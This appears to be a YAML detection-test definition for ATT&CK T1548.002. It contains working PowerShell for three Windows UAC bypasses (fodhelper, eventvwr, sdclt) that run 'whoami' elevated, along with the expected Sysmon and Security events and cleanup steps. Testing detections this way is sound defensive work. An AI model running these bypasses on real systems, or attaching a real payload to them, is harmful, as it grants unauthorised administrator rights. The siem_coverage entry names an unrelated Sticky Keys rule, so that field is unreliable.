id: T1548.002
name: UAC Bypass (Abuse Elevation Control Mechanism)
description: Tests three documented UAC bypass methods — fodhelper.exe (most common on Win10/11), eventvwr.msc (classic), and sdclt.exe. All create registry keys under HKCU\Software\Classes that auto-elevated Windows binaries use as shell handlers. Sysmon EID 13 on HKCU\Software\Classes\ms-settings path is in every major SIEM UAC bypass rule.
tactic: privilege-escalation
technique_id: T1548.002
platform: windows
phase: attack
elevation_required: false
tier: 1
expected_events:
  - event_id: 13
    channel: "Microsoft-Windows-Sysmon/Operational"
    description: "RegistryValueSet - HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
  - event_id: 1
    channel: "Microsoft-Windows-Sysmon/Operational"
    description: "fodhelper.exe / eventvwr.msc spawning cmd.exe with HIGH integrity level"
  - event_id: 4688
    channel: "Security"
    description: "Child process of fodhelper.exe — elevated token without UAC prompt"
  - event_id: 4673
    channel: "Security"
    description: "Privileged service called — UAC elevation event"
tags:
  - privilege-escalation
  - no-prereqs
siem_coverage:
  crowdstrike:
    - "Windows Logon Bypass (Sticky Keys)"
executor:
  type: powershell
  command: |-
    Write-Host "[T1548.002] UAC Bypass — fodhelper + eventvwr + sdclt methods"
    $out = "$env:TEMP\lnj_uac.txt"

    # Method 1: fodhelper.exe bypass (most common on Windows 10/11)
    # Creates HKCU\Software\Classes\ms-settings\Shell\Open\command
    # fodhelper reads this key and auto-elevates to execute the value
    Write-Host "--- Method 1: fodhelper.exe bypass (Sysmon EID 13 on ms-settings key) ---"
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(Default)" "cmd.exe /c whoami > `"$out`"" -Force
    Start-Process "$env:SystemRoot\System32\fodhelper.exe" -Wait
    Start-Sleep -Milliseconds 800
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
    Write-Host "fodhelper bypass executed — check Sysmon EID 13 path: HKCU\Software\Classes\ms-settings"

    # Method 2: eventvwr.msc bypass (classic technique — still effective)
    Write-Host "--- Method 2: eventvwr.msc bypass (Sysmon EID 13 on mscfile key) ---"
    New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" "(Default)" "cmd.exe /c whoami >> `"$out`"" -Force
    Start-Process "$env:SystemRoot\System32\eventvwr.msc" -Wait
    Start-Sleep -Milliseconds 800
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
    Write-Host "eventvwr bypass executed — Sysmon EID 13 on HKCU\Software\Classes\mscfile"

    # Method 3: sdclt.exe bypass (Windows 10 specific)
    Write-Host "--- Method 3: sdclt.exe bypass (Sysmon EID 13 on Folder\shell\open key) ---"
    New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\Folder\shell\open\command" "(Default)" "cmd.exe /c whoami >> `"$out`"" -Force
    New-ItemProperty "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "$env:SystemRoot\System32\sdclt.exe" -Wait
    Start-Sleep -Milliseconds 800
    Remove-Item "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore

    if (Test-Path $out) { Write-Host "Output: $(Get-Content $out)" }
    Write-Host "[T1548.002] Complete. Sysmon EID 13 on ms-settings/mscfile/Folder keys."
cleanup: |-
  Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
  Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
  Remove-Item "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
  Remove-Item "$env:TEMP\lnj_uac.txt" -ErrorAction Ignore
  Write-Host "Cleanup: UAC bypass registry keys removed."
